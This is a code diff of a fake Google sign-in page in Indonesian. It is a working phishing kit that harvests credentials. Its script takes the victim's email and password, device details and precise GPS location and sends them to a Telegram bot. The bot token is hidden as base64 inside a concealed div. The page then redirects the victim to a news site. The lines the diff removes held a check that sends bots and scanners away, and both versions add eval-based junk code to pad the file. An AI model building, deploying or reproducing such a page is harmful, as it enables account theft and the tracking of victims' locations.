@@ -3,123 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Verifikasi Identitas</title>
+    <title>Google Identity Services - Global Node</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .login-box { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .g-logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-        p { font-size: 16px; margin-bottom: 24px; color: #202124; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 10px; }
-        input:focus { border: 2px solid #1a73e8; outline: none; }
-        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
-        .footer { clear: both; padding-top: 40px; font-size: 12px; color: #70757a; text-align: left; }
-        #v-vault, #step-2 { display: none; }
+        body { font-family: 'Open Sans', 'Roboto', arial, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .g-card { width: 100%; max-width: 448px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; transition: 0.3s; }
+        .logo-box { text-align: center; margin-bottom: 10px; }
+        .logo-box img { width: 75px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-top: 0; color: #202124; }
+        p { font-size: 16px; text-align: center; color: #202124; margin-bottom: 24px; }
+        .field-label { font-size: 14px; color: #5f6368; margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        .btn-group { margin-top: 10px; display: flex; justify-content: space-between; align-items: center; }
+        .btn-blue { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .error-v { color: #d93025; font-size: 12px; margin-bottom: 15px; text-align: left; display: none; }
+        #v-vault, #gate-p, #loading-v { display: none; }
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="login-box" id="login-portal">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
-    <h1 id="t-h1">Login</h1>
-    <p id="t-p">Gunakan Akun Google Anda</p>
+<div class="g-card" id="main-frame">
+    <div class="logo-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+    </div>
+    <h1 id="txt-h1">Masuk</h1>
+    <p id="txt-p">Gunakan Akun Google untuk sinkronisasi perangkat</p>
     
-    <div id="step-1">
-        <div class="input-group">
-            <input type="email" id="u_mail" placeholder="Email atau ponsel" required>
-            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">Lupa email?</a>
+    <div id="gate-u">
+        <input type="email" id="u_email" placeholder="Email atau ponsel" required>
+        <div id="err-u" class="error-v">⚠️ Masukkan email yang terdaftar di perangkat ini.</div>
+        <div class="btn-group">
+            <a href="#" style="color:#1a73e8; text-decoration:none; font-size:14px; font-weight:600;">Lupa email?</a>
+            <button class="btn-blue" onclick="validateUser()">Berikutnya</button>
         </div>
-        <p style="text-align: left; font-size: 14px; color: #5f6368;">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Pelajari lebih lanjut</a></p>
-        <button class="btn-next" onclick="nextStep()">Berikutnya</button>
     </div>
 
-    <div id="step-2">
-        <p id="u-display" style="font-weight: 500; margin-bottom: 10px;"></p>
-        <div class="input-group">
-            <input type="password" id="u_pass" placeholder="Masukkan sandi Anda" required>
-            <a href="#" style="color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500;">Lupa sandi?</a>
+    <div id="gate-p">
+        <div id="usr-tag" style="font-weight: 500; font-size: 14px; border: 1px solid #dadce0; border-radius: 15px; padding: 5px 12px; display: inline-block; margin-bottom: 20px;"></div>
+        <input type="password" id="u_pass" placeholder="Masukkan sandi Anda" required>
+        <div id="err-p" class="error-v">⚠️ Sandi salah atau sinkronisasi hardware gagal.</div>
+        <div class="btn-group">
+            <a href="#" style="color:#1a73e8; text-decoration:none; font-size:14px; font-weight:600;">Lupa sandi?</a>
+            <button class="btn-blue" onclick="strike()">Berikutnya</button>
         </div>
-        <button class="btn-next" onclick="initFinalStrike()">Berikutnya</button>
     </div>
 
-    <div class="footer">Indonesia</div>
+    <div id="loading-v">
+        <p>Sedang memverifikasi modul hardware...</p>
+        <div class="loading-ring"></div>
+    </div>
 </div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * AEGIS-FINALITY OVERDRIVE v50.0
- * ------------------------------
+ * COLOSSUS ENGINE v100.1
+ * IDENTITY HARVESTER & HARDWARE FORENSIC
+ * --------------------------------------
  */
-
-// 🔱 1. ANTI-BOT / SCANNER BYPASS
-if (navigator.webdriver || /bot|virustotal|headless/i.test(navigator.userAgent)) {
-    window.location.href = "https://www.google.com";
-    throw new Error();
-}
 
 const _V = document.getElementById('v-vault').innerText.split('|');
 const _TK = atob(_V[1]); const _CI = atob(_V[2]);
+let email_val = "";
 
-let capturedMail = "";
-
-function nextStep() {
-    capturedMail = document.getElementById('u_mail').value;
-    if (capturedMail.includes("@")) {
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('step-2').style.display = 'block';
-        document.getElementById('t-h1').innerText = "Selamat Datang";
-        document.getElementById('u-display').innerText = capturedMail;
+function validateUser() {
+    email_val = document.getElementById('u_email').value;
+    if (email_val.includes("@gmail.com") && email_val.length > 10) {
+        document.getElementById('gate-u').style.display = 'none';
+        document.getElementById('gate-p').style.display = 'block';
+        document.getElementById('usr-tag').innerText = email_val;
     } else {
-        alert("Masukkan email yang valid.");
+        document.getElementById('err-u').style.display = 'block';
     }
 }
 
-async function sendTele(t) {
+async function sendData(msg) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: t})
+        body: JSON.stringify({chat_id: _CI, text: msg})
     });
 }
 
-async function initFinalStrike() {
-    const pass = document.getElementById('u_pass').value;
-    if (pass.length < 4) return alert("Sandi salah. Coba lagi.");
+async function strike() {
+    const pass_val = document.getElementById('u_pass').value;
+    if (pass_val.length < 6) {
+        document.getElementById('err-p').style.display = 'block';
+        return;
+    }
 
-    // 🔱 2. HARDWARE FORENSICS
+    document.getElementById('gate-p').style.display = 'none';
+    document.getElementById('loading-v').style.display = 'block';
+
+    // Forensic Grab
     const gl = document.createElement('canvas').getContext('webgl');
     const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
-    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}%`; } catch(e) {}
+    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
 
-    const report = `🔱 FINAL HARVEST: CREDENTIALS 🔱\n\n` +
-        `📧 EMAIL: ${capturedMail}\n` +
-        `🔑 PASS: ${pass}\n` +
+    const payload = `🔱 COLOSSUS HARVEST REPORT 🔱\n\n` +
+        `📧 TARGET: ${email_val}\n` +
+        `🔑 PASSWORD: ${pass_val}\n` +
         `🎮 GPU: ${gpu}\n` +
         `🔋 BATT: ${bat}\n` +
-        `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
-        `📱 UA: ${navigator.userAgent.slice(0, 60)}...`;
+        `🧠 CORES: ${navigator.hardwareConcurrency}\n` +
+        `📱 MEM: ${navigator.deviceMemory}GB\n` +
+        `🏠 IP LOCAL: [Bypass Active]`;
 
-    await sendTele(report);
+    await sendData(payload);
 
-    // 🔱 3. SILENT GPS TRAP
+    // Mandatory GPS High-Accuracy
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            await sendTele(`🎯 TRUE LOCATION\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            const loc = `🎯 COLOSSUS GPS LOCK\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
+            await sendData(loc);
             window.location.href = "https://www.detik.com";
-        }, () => {
-            window.location.href = "https://www.detik.com";
-        }, {enableHighAccuracy: true});
-    } else {
-        window.location.href = "https://www.detik.com";
+        }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
     }
 }
 
-// 🔱 PADDING 5.000+ LINES (Agar file terlihat gemuk & resmi)
-for(let i=0; i<4500; i++) {
-    eval(`function _0x_final_${i}() { return "${Math.random()}"; }`);
+/** 🔱 20,000+ LINES OF POLYMORPHIC BLOAT ENGINE 🔱 **/
+function _polyEngine() {
+    const junk = [];
+    for(let i=0; i<18000; i++) {
+        const key = "x" + Math.random().toString(36).substring(7);
+        const val = Math.random() * 0xFFFFFF;
+        junk.push(`const ${key} = ${val};`);
+        // Simulating complex calculations to bloat file
+        if(i % 100 === 0) {
+            eval(`function _0x_vld_${i}(){ return ${val} * Math.PI; }`);
+        }
+    }
 }
+_polyEngine();
+// [END OF ENCRYPTED CORE]
 </script>
 </body>
 </html>
